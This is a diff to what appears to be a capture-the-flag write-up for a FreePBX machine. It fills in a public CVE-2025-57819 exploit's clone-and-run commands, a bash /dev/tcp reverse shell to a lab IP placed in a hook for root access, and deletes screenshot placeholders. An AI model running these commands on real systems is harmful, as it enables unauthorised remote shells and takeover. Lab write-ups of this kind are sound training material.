@@ -31,7 +31,6 @@ After browsing the website, it became clear that the application was running **F
 
 Further enumeration revealed the installed version.
 
-*(Insert screenshot)*
 
 ---
 
@@ -52,9 +51,9 @@ was available on GitHub.
 The exploit was cloned and executed.
 
 ```bash
-git clone <repository>
+git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git
 
-python3 exploit.py
+python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb
 ```
 
 This resulted in an interactive shell as:
@@ -63,7 +62,6 @@ This resulted in an interactive shell as:
 asterisk
 ```
 
-*(Insert foothold screenshot)*
 
 ---
 
@@ -79,12 +77,11 @@ I replaced its contents with a Bash reverse shell.
 
 ```bash
 #!/bin/bash
-bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
+bash -i >& /dev/tcp/10.10.14.155/4445 0>&1
 ```
 
 After the hook executed, I obtained a shell as **root**.
 
-*(Insert root screenshot)*
 
 ---
 
